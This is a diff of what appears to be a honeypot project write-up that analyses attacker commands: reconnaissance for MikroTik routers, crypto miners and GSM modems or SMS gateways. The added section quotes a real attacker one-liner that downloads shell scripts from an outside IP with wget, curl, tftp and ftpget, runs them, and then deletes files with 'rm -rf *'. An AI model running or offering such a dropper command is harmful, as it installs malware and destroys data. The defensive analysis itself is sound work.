@@ -74,12 +74,13 @@ Visualizations include:
 
 ## **Attacker Behavior & Investigation**
 
-The honeypot has been running for one week (currently on day 4), capturing live attack data. In this section, I will investigate specific IP addresses, analyze command sequences, and attempt to infer attacker intent based on behavior.
+The honeypot has been running for one week capturing live attack data. In this section, I will investigate specific IP addresses, analyze command sequences, and attempt to infer attacker intent based on behavior.
 
 ### 134.209.120.69 
 
-According to abuseipd.com, this is a known malicious ip with over 100 reports. They seem to be leveraging the cloud as the IP is a digital ocean IP which makes me believe that they are running out of the Digital Ocean cloud.
+According to abuseipd.com, this is a know malicious ip with over 14,000 reports. They seem to be leveraging the cloud as the IP is a digital ocean IP which makes me believe that they are running out of the Digital Ocean cloud or utilizing a private VPN running on Digital Ocean.
 This attack most likely came from a bot considering the speed of the commands entered and the fact that I can find this attack replicated online.
+
 The bot ran multiple commands that:
 - Attempted to identify whether the system was a **router**, **SMS server**, or **crypto mining node**
 - Searched for pre-existing malware or mining processes
@@ -91,12 +92,12 @@ Some of the more interesting commands they tried to execute include:
   
   Purpose: This command is not a standard Linux command. It's actually a command specific to MikroTik RouterOS. 
   What it does: It prints the public IP address and other cloud settings of the MikroTik device. 
-  Why a malicious user uses it: If your server is running MikroTik RouterOS, this would help the attacker identify the external IP address of the device. 
+  Why a malicious user may use it: If your server is running MikroTik RouterOS, this would help the attacker identify the external IP address of the device. 
 
 `ps | grep '[Mm]iner'`
 
 Purpose: Lists running processes and checks if a cryptocurrency miner is already running. 
-Why a malicious user uses it: 
+Why a malicious user may use it: 
 - To check if the system is already infected with a crypto miner. 
 - To avoid conflict with another attacker's miner.
 - To possibly kill competing miners and install their own.
@@ -108,7 +109,7 @@ This one was a long ls command so I broke it down into multiple parts.
 `/dev/ttyGSM*, /dev/modem*, /dev/ttyUSB-mod*`
 
 What it is: These are device files typically associated with modems — especially GSM (cellular) or USB-based LTE sticks. 
-Why they care: If the attacker finds a GSM modem, they might try to: 
+Why a malicious user may use it: If the attacker finds a GSM modem, they might try to: 
 - Send or receive SMS messages. 
 - Exploit the modem to gain data connectivity. 
 - Use the device for SMS spamming, phishing, or OTP interception. 
@@ -116,24 +117,30 @@ Why they care: If the attacker finds a GSM modem, they might try to:
 `/var/spool/sms/*, /var/log/smsd.log, /etc/smsd.conf*, /var/config/sms/* `
 
 What it is: These paths are associated with SMS server software, especially smstools. Smstools allows a server to send/receive SMS messages via a connected modem. 
-Why they care: They're checking if your server is acting as an SMS gateway. If so, they might try to hijack it to send bulk spam, fraud messages, or phishing attacks. 
+Why a malicious user may use it: They're checking if your server is acting as an SMS gateway. If so, they might try to hijack it to send bulk spam, fraud messages, or phishing attacks. 
 
 `/usr/bin/qmuxd, /var/qmux_connect_socket, /etc/config/simman `
 
 What it is: qmuxd is a daemon used in Qualcomm-based modems for managing communication between the OS and the cellular modem (via QMI). simman likely refers to SIM management tools on embedded Linux systems or routers. 
-Why they care: They’re trying to detect a cellular router or embedded system (like OpenWRT with a SIM card). These are often misconfigured or insecure, and attackers can abuse the mobile data and SMS functions. 
 
-**Why would someone run this? **
-
-This command is part of a targeted script that checks if your system: 
+Why a malicious user may use it: This command is part of a targeted script that checks if your system: 
 - Has a SIM card or LTE modem. 
 - Is running an SMS gateway or cellular router setup. 
-
 This allows them to potentially:
 - Send spam SMS. 
 - Intercept or forward OTPs (e.g., MFA codes). 
 - Use your mobile data plan or IP address for shady traffic. 
 
 This is common on IoT devices, industrial routers, and small embedded systems that get exposed to the internet (often unintentionally). 
+
+### 206.189.80.159 
+
+According to abuseipd.com, this is a known malicious ip with over 100 reports. Like the previous malicious IP we investigated, they also seem to be utilizing Digital Ocean cloud services to launch their attacks from.
+
+This attacker only tried to run one command.
+
+`cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.178.235.240/ohshit.sh; curl -O http://103.178.235.240/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 103.178.235.240 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 103.178.235.240; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.178.235.240 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *`
+
+Purpose: The script first attempts to change directories to a series of locations on the local system (/tmp, /var/run, /mnt, /root, or /), presumably trying to find an accessible location to operate from.  It then tries to download a presumably malicous file using three different download methids (curl, tftp, and ftpget)
 
 
